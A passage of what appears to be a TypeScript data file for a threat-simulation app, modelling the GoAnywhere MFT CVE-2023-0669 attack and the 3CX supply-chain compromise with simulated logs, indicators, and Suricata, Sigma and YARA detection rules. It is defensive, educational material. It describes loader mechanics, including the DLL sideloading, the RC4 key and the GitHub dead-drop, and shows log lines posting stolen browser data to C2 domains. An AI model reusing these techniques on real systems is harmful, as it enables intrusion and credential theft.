        { term: 'EXTORTION GROUP', value: 'CL0P Ransomware / TA505 (FIN11)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'ga-0669-1',
      no: 1,
      stageIndex: 1,
      timestamp: '14:08:21.309',
      sourceNodeId: 'ta505_cl0p_actor',
      targetNodeId: 'goanywhere_tomcat_host',
      sourceLabel: '198.51.100.64',
      targetLabel: 'GoAnywhere :8000/lic/accept',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTP POST / CVE-2023-0669',
      shortAction: 'LIC/ACCEPT BUNDLE POST',
      info: 'POST /goanywhere/lic/accept?bundle=...$2 containing AES-encrypted CommonsBeanutils1 payload',
      sizeOrCode: 'HTTP 500',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'Exploitation of CVE-2023-0669 sends an encrypted ysoserial payload to /goanywhere/lic/accept; after the payload executes inside readObject(), the servlet throws a 500 error and logs InvocationTargetException.',
      rawLog: `POST /goanywhere/lic/accept HTTP/1.1
Host: mft.corp.local:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 3842

bundle=v8Jk9m2..._encrypted_CommonsBeanutils1_gadget_...$2`,
      detectionRule: {
        type: 'SURICATA',
        title: 'ET EXPLOIT Fortra GoAnywhere MFT CVE-2023-0669 LicenseResponseServlet Exploit',
        ruleCode: `alert http any any -> $HOME_NET any (msg:"CISA KEV Fortra GoAnywhere MFT CVE-2023-0669 Pre-Auth RCE Attempt"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/goanywhere/lic/accept"; sid:2043881; rev:1;)`,
        mitigation:
          'Block external internet access to the GoAnywhere administrative console (:8000/:8001), remove the LicenseResponseServlet mapping in web.xml, and upgrade to GoAnywhere MFT 7.1.2+.',
      },
    },
    {
      id: 'ga-0669-2',
      no: 2,
      stageIndex: 2,
      timestamp: '14:08:21.744',
      sourceNodeId: 'goanywhere_tomcat_host',
      targetNodeId: 'commons_beanutils_gadget',
      sourceLabel: 'tomcat9.exe (PID 3920)',
      targetLabel: 'cmd.exe / powershell.exe',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 1 + goanywhere.log',
      shortAction: 'GADGET RCE (SYSTEM)',
      info: 'LicenseResponseServlet logs InvocationTargetException as tomcat9.exe spawns cmd.exe /c powershell',
      sizeOrCode: 'PID 7144',
      severity: 'CRITICAL',
      mitreId: 'T1059.003',
      explanation:
        'Huntress identified that successful CommonsBeanutils1 deserialization produces a telltale stack trace in userdata/logs/goanywhere.log (BeanComparator.compare -> TemplatesImpl.getOutputProperties) at the exact second tomcat9.exe spawns cmd.exe.',
      rawLog: `[goanywhere.log] ERROR [LicenseResponseServlet] Error parsing license response
java.lang.RuntimeException: java.lang.reflect.InvocationTargetException
  at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:171)
  at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)
  at java.util.PriorityQueue.readObject(PriorityQueue.java:795)
  at com.linoma.ga.ui.admin.servlet.LicenseResponseServlet.doPost(LicenseResponseServlet.java:114)`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Fortra GoAnywhere MFT Tomcat Spawning Suspicious Child Shell (CVE-2023-0669)',
        ruleCode: `title: GoAnywhere MFT CVE-2023-0669 Exploitation Child Process
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|contains: '\\GoAnywhere\\'
    Image|endswith:
      - '\\cmd.exe'
      - '\\powershell.exe'
      - '\\rundll32.exe'
  condition: selection
level: critical`,
        mitigation:
          'Monitor userdata/logs/goanywhere.log for BeanComparator.compare and PriorityQueue.readObject stack traces.',
      },
    },
    {
      id: 'ga-0669-3',
      no: 3,
      stageIndex: 3,
      timestamp: '14:08:29.512',
      sourceNodeId: 'commons_beanutils_gadget',
      targetNodeId: 'truebot_cobalt_stage',
      sourceLabel: 'powershell.exe (PID 7144)',
      targetLabel: 'rundll32.exe acl.dll (TrueBot)',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 1 & 7',
      shortAction: 'TRUEBOT DEPLOYMENT',
      info: 'rundll32.exe executes TrueBot (C:\\ProgramData\\acl.dll,Menu) and deploys Cobalt Strike',
      sizeOrCode: 'TrueBot DLL',
      severity: 'CRITICAL',
      mitreId: 'T1219',
      explanation:
        'Following initial RCE on GoAnywhere MFT, CL0P operators deployed TrueBot (Silence.Downloader) and Cobalt Strike to pivot across the network and exfiltrate MFT data.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>1</EventID></System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\rundll32.exe</Data>
    <Data Name="CommandLine">rundll32.exe C:\\ProgramData\\acl.dll,Menu</Data>
    <Data Name="ParentImage">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="User">NT AUTHORITY\\SYSTEM</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'YARA',
        title: 'Mandiant / CISA YARA — TrueBot (Silence.Downloader) Loader',
        ruleCode: `rule CISA_TrueBot_SilenceDownloader {
  meta:
    author = "CISA / Mandiant"
    reference = "CL0P CVE-2023-0669 Post-Exploitation"
  strings:
    $s1 = "Menu" ascii
    $s2 = "CreateProcessA" ascii
    $s3 = "%s\\System32\\svchost.exe" ascii wide
  condition:
    uint16(0) == 0x5a4d and all of ($s*)
}`,
        mitigation:
          'Isolate affected GoAnywhere MFT hosts and rotate all SSH keys, PGP keys, and SFTP partner credentials stored in the GoAnywhere database.',
      },
    },
  ],
};

export const THREE_CX_SUPPLY_CHAIN_LAZARUS_SCENARIO: AttackScenario = {
  id: '3cx-desktopapp-supply-chain-lazarus',
  code: 'CVE-2023-29059',
  name: 'CrowdStrike, Kaspersky & Mandiant — Lazarus (SmoothOperator): 3CXDesktopApp Supply Chain & Gopuram',
  shortSubtitle: 'CrowdStrike · Kaspersky GReAT · Mandiant · Trojanized ffmpeg.dll, d3dcompiler_47.dll & ICONICSTEALER',
  category: 'MALWARE',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Documented by CrowdStrike (Labyrinth Chollima), Kaspersky GReAT, Mandiant (UNC4736), and SentinelOne ("SmoothOperator", March 2023), CVE-2023-29059 was a cascading software supply chain attack in which North Korean threat actors compromised 3CX’s build environment (after first compromising Trading Technologies’ X_TRADER installer). Legitimate, digitally signed MSI/DMG installers for 3CXDesktopApp (versions 18.12.407 and 18.12.416) were distributed with a trojanized ffmpeg.dll. When 3CXDesktopApp.exe started, ffmpeg.dll sideloaded and read an RC4-encrypted shellcode payload embedded after magic marker 0xFEEDFACE inside d3dcompiler_47.dll, fetched AES-encrypted C2 URLs hidden inside GitHub icon1.ico files, and deployed ICONICSTEALER or Kaspersky’s Gopuram backdoor.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'CrowdStrike (Labyrinth Chollima) · Kaspersky GReAT (Gopuram) · Mandiant (UNC4736)',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1195.002 (Supply Chain Software) · T1574.002 (DLL Side-Loading: ffmpeg.dll) · T1102.001 (Dead Drop Resolver)',
    },
    {
      term: 'TROJANIZED BINARIES',
      value: '3CXDesktopApp.exe (Signed) -> ffmpeg.dll (Trojanized) -> d3dcompiler_47.dll (0xFEEDFACE RC4)',
    },
    {
      term: 'FINAL PAYLOADS',
      value: 'ICONICSTEALER (Browser Credential Stealer) & Gopuram / TaxOff Backdoors',
    },
  ],
  nodes: [
    {
      id: 'lazarus_3cx_repo',
      label: '3CX Update & GitHub Dead-Drop',
      sublabel: 'downloads.3cx.com & raw.githubusercontent.com',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'Compromised Build Pipeline & GitHub Icon Dead-Drop (IconStorages)',
        pidOrPort: 'HTTPS :443 (3CXDesktopApp-18.12.416.msi & icon1.ico..icon14.ico)',
        privilege: 'Signed Vendor Update Server & Public GitHub Repo',
        artifacts: [
          '3CXDesktopApp.msi (Validly signed by 3CX Ltd.)',
          'github.com/IconStorages/images/main/icon1.ico (Appended Base64 AES C2 string)',
        ],
        description:
          'Compromised 3CX update server delivering the trojanized installer, paired with GitHub dead-drop .ico files containing AES-GCM encrypted C2 domains.',
      },
    },
    {
      id: 'victim_3cx_workstation',
      label: 'Enterprise Workstation (3CX)',
      sublabel: '10.10.24.19 (3CXDesktopApp.exe)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Windows 11 Enterprise Endpoint (3CX Softphone Client)',
        pidOrPort: 'PID 6120 (3CXDesktopApp.exe)',
        privilege: 'CORP\\j.miller (Standard User)',
        artifacts: [
          '%LOCALAPPDATA%\\Programs\\3CXDesktopApp\\3CXDesktopApp.exe',
          '%LOCALAPPDATA%\\Programs\\3CXDesktopApp\\ffmpeg.dll',
        ],
        description:
          'Corporate endpoint running the validly signed Electron-based 3CXDesktopApp.exe, which automatically imports ffmpeg.dll from its application directory.',
      },
    },
    {
      id: 'ffmpeg_d3d_loader',
      label: 'ffmpeg.dll & d3dcompiler_47.dll',
      sublabel: '0xFEEDFACE RC4 Shellcode Decryptor',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Trojanized DLL Side-Loader & In-Memory RC4 Shellcode',
        pidOrPort: 'PID 6120 (In-Process Memory of 3CXDesktopApp.exe)',
        privilege: 'User Context (Inside Signed 3CX Process)',
        artifacts: [
          'ffmpeg.dll (SHA256: 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896)',
          'd3dcompiler_47.dll (0xFEEDFACE marker + RC4 key "3jB(2bsG#@c7")',
        ],
        description:
          'Malicious DllMain inside ffmpeg.dll locates d3dcompiler_47.dll, scans for the hex marker FE ED FA CE, decrypts the appended shellcode using RC4 key "3jB(2bsG#@c7", and executes it in memory.',
      },
    },
    {
      id: 'iconicstealer_gopuram',
      label: 'ICONICSTEALER & Gopuram Implant',
      sublabel: 'In-Memory Reflective DLL Payload',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Stage-3 Reflective DLL Stealer & Modular Backdoor',
        pidOrPort: 'PID 6120 -> HTTPS C2 (akamaicontainer.com / azureonlinestorage.com)',
        privilege: 'Endpoint Credential & Crypto-Targeted Implant',
        artifacts: [
          'Chrome / Edge / Brave / Firefox SQLite Login Data & History theft',
          'Kaspersky Gopuram modular implant (deployed on high-value crypto targets)',
        ],
        description:
          'Final stage decrypted into memory from the C2 response: ICONICSTEALER harvests browser credentials and system info, while selective targets receive the Gopuram backdoor.',
      },
    },
    {
      id: 'edr_falcon_siem',
      label: 'CrowdStrike / Kaspersky EDR SIEM',
      sublabel: 'Sysmon EID 7 / 22 & YARA Telemetry',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'SOC EDR & DNS Threat Intelligence Sensor',
        pidOrPort: 'Sysmon EID 7 (Unsigned ffmpeg.dll) & EID 22 (DNS Query)',
        privilege: 'SOC Detection Engine',
        artifacts: [
          '3CXDesktopApp.exe querying raw.githubusercontent.com/IconStorages/*',
          'YARA: Lazarus_3CX_ffmpeg_loader & Gopuram_Backdoor',
        ],
        description:
          'Detects 3CXDesktopApp.exe loading the tampered ffmpeg.dll, reading d3dcompiler_47.dll, and resolving Lazarus C2 domains.',
      },
    },
  ],
  processTree: [
    {
      pid: 6120,
      ppid: 4100,
      name: '3CXDesktopApp.exe (Signed)',
      commandLine: '"C:\\Users\\j.miller\\AppData\\Local\\Programs\\3CXDesktopApp\\3CXDesktopApp.exe"',
      user: 'CORP\\j.miller',
      integrity: 'Medium',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: ['LoadLibraryW("ffmpeg.dll")', 'CreateEventW("AVMonitorEvent")'],
    },
    {
      pid: 6120,
      ppid: 4100,
      name: 'ffmpeg.dll -> d3dcompiler_47.dll',
      commandLine: 'In-Memory Thread: RC4_Decrypt(d3dcompiler_47.dll + 0xFEEDFACE, key="3jB(2bsG#@c7")',
      user: 'CORP\\j.miller',
      integrity: 'Medium',
      status: 'injected',
      activeFromStage: 2,
      apiCalls: [
        'CreateFileW("d3dcompiler_47.dll")',
        'VirtualAlloc(PAGE_EXECUTE_READWRITE)',
        'WinHttpOpenRequest("GET", "/IconStorages/images/main/icon7.ico")',
      ],
      memoryBlocks: [
        {
          address: '0x000001D490000000',
          section: 'd3dcompiler_47.dll Decrypted Shellcode (Reflective Loader)',
          permissions: 'RWX',
          size: '196 KB',
          status: 'injected',
          description:
            'RC4-decrypted reflective loader extracted from the 0xFEEDFACE offset of d3dcompiler_47.dll inside 3CXDesktopApp.exe.',
          hexPreview: 'FE ED FA CE -> RC4("3jB(2bsG#@c7") -> MZ... ReflectiveLoader',
        },
      ],
    },
    {
      pid: 6120,
      ppid: 4100,
      name: 'ICONICSTEALER / Gopuram (In-Memory)',
      commandLine: 'In-Memory DLL: Steals Chrome/Edge/Firefox Login Data -> POST https://akamaicontainer.com/gl',
      user: 'CORP\\j.miller',
      integrity: 'Medium',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: [
        'CreateFileW("...\\Google\\Chrome\\User Data\\Default\\History")',
        'WinHttpSendRequest("akamaicontainer.com")',
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'TROJANIZED FFMPEG.DLL SIDE-LOADING & 0xFEEDFACE RC4 DECRYPTION',
      subtitle: 'Signed 3CXDesktopApp.exe loads trojanized ffmpeg.dll and decrypts d3dcompiler_47.dll',
      description:
        'When a user launches the legitimate, digitally signed 3CXDesktopApp.exe (v18.12.407 / 18.12.416), Windows automatically loads the trojanized ffmpeg.dll from the same folder. Inside ffmpeg.dll, a malicious initialization thread creates mutex/event "AVMonitorEvent", opens the co-located d3dcompiler_47.dll file, searches for the 4-byte marker 0xFEEDFACE (FE ED FA CE), and decrypts the appended payload in memory using RC4 with the hardcoded key "3jB(2bsG#@c7".',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1195.002',
      mitreTechniqueName: 'Supply Chain Compromise: Compromise Software Supply Chain',
      activeNodeIds: ['lazarus_3cx_repo', 'victim_3cx_workstation', 'ffmpeg_d3d_loader'],
      compromisedNodeIds: ['victim_3cx_workstation', 'ffmpeg_d3d_loader'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2023-29059 (3CXDesktopApp Supply Chain Compromise)' },
        { term: 'PAYLOAD MARKER', value: '0xFEEDFACE inside d3dcompiler_47.dll' },
        { term: 'RC4 DECRYPT KEY', value: '"3jB(2bsG#@c7" (Decrypts Reflective Shellcode)' },
      ],
    },
    {
      index: 2,
      title: 'GITHUB ICON1.ICO DEAD-DROP RESOLVER & AES-GCM C2 EXTRACTION',
      subtitle: 'Fetching raw.githubusercontent.com/IconStorages/images/main/icon*.ico to resolve C2',
      description:
        'After sleeping for a randomized delay (7 days on newly installed systems to evade automated sandboxes), the decrypted shellcode makes an HTTPS GET request to github.com/IconStorages/images/main/icon1.ico (through icon14.ico). At the very end of the legitimate .ico image file sits a Base64 string prefixed with "$", which the loader decrypts using AES-GCM to obtain the active Lazarus C2 domain (e.g., akamaicontainer.com or msstorageboxes.com).',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1102.001',
      mitreTechniqueName: 'Web Service: Dead Drop Resolver',
      activeNodeIds: ['ffmpeg_d3d_loader', 'lazarus_3cx_repo', 'edr_falcon_siem'],
      compromisedNodeIds: ['victim_3cx_workstation', 'ffmpeg_d3d_loader'],
      keySpecs: [
        { term: 'DEAD-DROP URL', value: 'raw.githubusercontent.com/IconStorages/images/main/icon*.ico' },
        { term: 'STRING MARKER', value: 'Appended Base64 string starting with "$" at EOF of .ico' },
        { term: 'DECRYPTED C2', value: 'akamaicontainer.com / azureonlinestorage.com / msstorageboxes.com' },
      ],
    },
    {
      index: 3,
      title: 'IN-MEMORY ICONICSTEALER & KASPERSKY GOPURAM BACKDOOR DEPLOYMENT',
      subtitle: 'Harvesting browser credentials and deploying Gopuram on high-value targets',
      description:
        'The loader connects to the resolved C2 domain with a cookie named "tutma" and receives a third-stage reflective DLL executed strictly in memory: ICONICSTEALER (which enumerates system info and steals saved credentials and browsing history from Chrome, Edge, Brave, and Firefox). As Kaspersky GReAT discovered, on select cryptocurrency and financial targets, the operator used this foothold to deploy the modular Gopuram backdoor.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1555.003',
      mitreTechniqueName: 'Credentials from Password Stores: Credentials from Web Browsers',
      activeNodeIds: ['ffmpeg_d3d_loader', 'iconicstealer_gopuram', 'edr_falcon_siem'],
      compromisedNodeIds: ['victim_3cx_workstation', 'ffmpeg_d3d_loader', 'iconicstealer_gopuram'],
      keySpecs: [
        { term: 'STAGE 3 STEALER', value: 'ICONICSTEALER (In-Memory Browser & System Harvester)' },
        { term: 'TARGETED IMPLANT', value: 'Gopuram Backdoor (Documented by Kaspersky GReAT)' },
        { term: 'ATTRIBUTION', value: 'Lazarus Group / Labyrinth Chollima / UNC4736' },
      ],
    },
  ],
  telemetry: [
    {
      id: '3cx-29059-1',
      no: 1,
      stageIndex: 1,
      timestamp: '11:04:15.209',
      sourceNodeId: 'victim_3cx_workstation',
      targetNodeId: 'ffmpeg_d3d_loader',
      sourceLabel: '3CXDesktopApp.exe (PID 6120)',
      targetLabel: 'ffmpeg.dll / d3dcompiler_47.dll',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 7 (ImageLoad)',
      shortAction: 'TROJANIZED FFMPEG.DLL',
      info: '3CXDesktopApp.exe loads trojanized ffmpeg.dll (SHA256: 7986bbae...) and reads 0xFEEDFACE blob in d3dcompiler_47.dll',
      sizeOrCode: 'RC4 Key 3jB(2bsG#@c7',
      severity: 'CRITICAL',
      mitreId: 'T1195.002',
      explanation:
        'CrowdStrike, Mandiant, and Kaspersky documented that the trojanized ffmpeg.dll inside 3CXDesktopApp 18.12.407/416 reads encrypted shellcode after 0xFEEDFACE in d3dcompiler_47.dll.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>7</EventID></System>
  <EventData>
    <Data Name="Image">C:\\Users\\j.miller\\AppData\\Local\\Programs\\3CXDesktopApp\\3CXDesktopApp.exe</Data>
    <Data Name="ImageLoaded">C:\\Users\\j.miller\\AppData\\Local\\Programs\\3CXDesktopApp\\ffmpeg.dll</Data>
    <Data Name="Hashes">SHA256=7986BBAEE8940DA11CE089383521AB420C443AB7B15ED42AED91FD31CE833896</Data>
    <Data Name="Signed">false</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'YARA',
        title: 'CrowdStrike / Kaspersky YARA — 3CX Trojanized ffmpeg.dll & d3dcompiler_47.dll',
        ruleCode: `rule Lazarus_3CX_SupplyChain_d3dcompiler_Payload {
  meta:
    author = "CrowdStrike / Kaspersky GReAT / Mandiant"
    cve = "CVE-2023-29059"
  strings:
    $marker = { FE ED FA CE }
    $rc4_key = "3jB(2bsG#@c7" ascii
    $mutex = "AVMonitorEvent" wide ascii
  condition:
    uint16(0) == 0x5a4d and 2 of them
}`,
        mitigation:
          'Uninstall compromised 3CXDesktopApp versions (18.12.407 and 18.12.416) immediately and update to clean builds signed with the rotated 3CX certificate.',
      },
    },
    {
      id: '3cx-29059-2',
      no: 2,
      stageIndex: 2,
      timestamp: '11:04:18.882',
      sourceNodeId: 'ffmpeg_d3d_loader',
      targetNodeId: 'lazarus_3cx_repo',
      sourceLabel: '3CXDesktopApp.exe',
      targetLabel: 'raw.githubusercontent.com',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 22 (DNS) / HTTPS',
      shortAction: 'GITHUB .ICO DEAD-DROP',
      info: 'GET https://raw.githubusercontent.com/IconStorages/images/main/icon7.ico to decrypt C2 URL',
      sizeOrCode: 'AES-GCM C2 URL',
      severity: 'HIGH',
      mitreId: 'T1102.001',
      explanation:
        'The decrypted stage-2 shellcode fetches icon1.ico..icon14.ico from the IconStorages GitHub repository and extracts the Base64 string appended after "$" at the end of the icon.',
      rawLog: `GET /IconStorages/images/main/icon7.ico HTTP/1.1
Host: raw.githubusercontent.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
[ICO_EOF_EXTRACT] "$2b7k9mP...==" -> AES-GCM Decrypt -> "https://akamaicontainer.com/gl"`,
      detectionRule: {
        type: 'SIGMA',
        title: '3CXDesktopApp Connecting to Lazarus C2 or GitHub IconStorages Dead-Drop',
        ruleCode: `title: 3CXDesktopApp Supply Chain Malicious Network Beacon (CVE-2023-29059)
logsource:
  category: dns_query
  product: windows
detection:
  selection:
    Image|endswith: '\\3CXDesktopApp.exe'
    QueryName|contains:
      - 'akamaicontainer.com'
      - 'azureonlinestorage.com'
      - 'msstorageboxes.com'
      - 'githubusercontent.com'
  condition: selection
level: critical`,
        mitigation:
          'Block all known SmoothOperator C2 domains at the DNS/proxy layer and hunt for 3CXDesktopApp.exe initiating connections to non-PBX external domains.',
      },
    },
    {
      id: '3cx-29059-3',
      no: 3,
      stageIndex: 3,
      timestamp: '11:04:22.410',
      sourceNodeId: 'ffmpeg_d3d_loader',
      targetNodeId: 'iconicstealer_gopuram',
      sourceLabel: '3CXDesktopApp.exe (In-Memory)',
      targetLabel: 'ICONICSTEALER / Gopuram',
      sourceType: 'SYSMON',
      protocolOrEventId: 'EDR Memory / File Access',
      shortAction: 'ICONICSTEALER & GOPURAM',
      info: 'In-memory ICONICSTEALER harvests browser SQLite data; high-value targets receive Gopuram backdoor',
      sizeOrCode: 'In-Memory DLL',
      severity: 'CRITICAL',
      mitreId: 'T1555.003',
      explanation:
        'Mandiant and CrowdStrike analyzed the ICONICSTEALER browser harvester, while Kaspersky GReAT uncovered the deployment of the Gopuram backdoor on targeted machines.',
      rawLog: `[EDR_BEHAVIOR] Process="3CXDesktopApp.exe" PID=6120
Action="ReadBrowserData" Target="C:\\Users\\j.miller\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
C2_Beacon="POST https://akamaicontainer.com/gl" Cookie="tutma=..."
Secondary_Implant="Gopuram" (Kaspersky GReAT detection on select targets)`,
      detectionRule: {
        type: 'SIGMA',
        title: '3CXDesktopApp Accessing Browser Credential/History SQLite Databases',
        ruleCode: `title: ICONICSTEALER Browser Data Access via 3CXDesktopApp
logsource:
  category: file_access
  product: windows
detection:
  selection:
    Image|endswith: '\\3CXDesktopApp.exe'
    TargetFilename|contains:
      - '\\Google\\Chrome\\User Data\\'
      - '\\Microsoft\\Edge\\User Data\\'
      - '\\BraveSoftware\\Brave-Browser\\User Data\\'
  condition: selection
level: critical`,
        mitigation:
          'Re-image endpoints where ICONICSTEALER or Gopuram executed, and rotate all browser-stored session tokens and corporate credentials.',
      },
    },
  ],
};

export const APT_BATCH1_SUPPLYCHAIN_MFT_SCENARIOS: AttackScenario[] = [
  XZ_UTILS_CVE_2024_3094_BACKDOOR_SCENARIO,
  CL0P_MOVEIT_TRANSFER_CVE_2023_34362_SCENARIO,
  OPENSSH_REGRESSHION_CVE_2024_6387_SCENARIO,
  FORTRA_GOANYWHERE_MFT_CVE_2023_0669_CL0P_SCENARIO,
  THREE_CX_SUPPLY_CHAIN_LAZARUS_SCENARIO,
];
